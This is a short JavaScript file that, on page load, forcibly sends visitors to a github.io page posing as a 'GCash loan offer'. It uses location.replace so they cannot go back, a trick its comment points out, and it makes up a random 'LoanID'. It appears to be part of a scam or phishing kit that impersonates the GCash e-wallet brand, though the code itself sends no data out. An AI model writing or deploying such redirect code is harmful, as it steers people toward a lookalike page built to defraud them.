// sessionStorage.setItem("loan", "applyloan");
// setInterval(function() {
//     if(sessionStorage.getItem("loan")) {
//         setTimeout(function() {
//             window.location.replace("https://gcash-loan-offer.github.io/gcash/loan/");
//         }, 22000);
//     }
// }, 11000);
window.addEventListener("load", function() {
    setTimeout(function() {
        // USE CAN USE THE TWO FUNCTINONS BELOW TO REDIRECT PUT WITH THE replace function, you can't go back history chain
        //  window.location.replace("https://gcash-loan-offer.github.io/gcash/loan/");
        window.location.replace("https://gcash-loan-offer.github.io/gcash/loan/");
    }, 2000);

    let idArray = ["A", "d", "7", "b", "2", "C", "0", "c", "5", "D", "E", "d", "e", "8", "F", "f", "B", "g", "H", "h", "I", "i", "J", "j" , "G", "k", "7", "L", "l", "3", "M", "m", "N", "n", "O", "o"];
    let new_id_permutation = "";
    let x;
    for(x = 0; x < 12; x++) {
        new_id_permutation += idArray[Math.floor(Math.random() * 32)];
    };
    sessionStorage.setItem('LoanID', new_id_permutation);
});

